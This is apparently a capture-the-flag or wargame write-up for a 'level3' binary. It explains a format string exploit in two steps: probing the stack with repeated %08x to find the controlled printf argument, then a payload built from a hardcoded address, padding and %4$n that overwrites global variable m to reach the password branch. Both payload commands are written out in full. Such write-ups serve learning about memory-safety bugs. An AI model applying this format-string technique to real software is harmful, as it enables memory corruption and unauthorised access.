##Exploit type: format string vulnerability to set a variable value


The purpose of this level is to override vale of global variable m
to enter a if that will give us the password for next lv


It works in 2 steps. 1st check which parameter of printf we
control. we input AAAA%x%x.... until we find our As on stack.
The thing is printf doesnt know what to print since it is
user input, so we load user input with a bunch of %x to print
stack as hex.

--> echo AAAA$(python -c 'print "%08x."*20'), we control 4th printf param

2nd step is overriding value on stack thanks to %n that writes
the number of chars written to a given address.

The if we want to enter to is ok if the global variable m equals
64, so we should print address we want 1st (address of m), then 60 chars
and end by %[num_arg_controlled]$n (dollar says we go straight to 4th param)

--> echo $(python -c "print '\x8c\x98\x04\x08' + 'A' * 60 + '%4\$n'") > file
		here care escape the dollar esle it wouldnt be printed as such

	and finally 
		cat file - | ./level3
